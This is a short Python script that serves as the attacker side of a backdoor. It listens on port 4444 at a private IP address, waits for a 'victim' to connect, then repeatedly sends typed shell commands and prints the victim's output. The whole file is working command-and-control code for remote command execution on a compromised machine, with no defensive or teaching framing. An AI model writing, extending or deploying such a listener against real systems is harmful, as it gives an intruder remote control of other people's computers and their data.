import socket
import time

my_ip = '192.168.68.59'
port = 4444
server = socket.socket()
server.bind((my_ip, port))
print('[+] Server Started')
print('[+] Listening For Victim')
server.listen(1)
victim, victim_addr = server.accept()
print(f'[+] {victim_addr} Victim opened the backdoor')
while True:
    try:
        command = input('Enter Command : ')
        if command == None:
            command = 'cd'
        command = command.encode()
        print(command)
        victim.send(command)
        print('[+] Command sent')
    except Exception as e:
        print(e)
        pass
    try:
        output = victim.recv(1000000000)
        output = output.decode()
        print(f"Output: {output}")
    except Exception as e:
        print(e)
        print("not working LOL")
        pass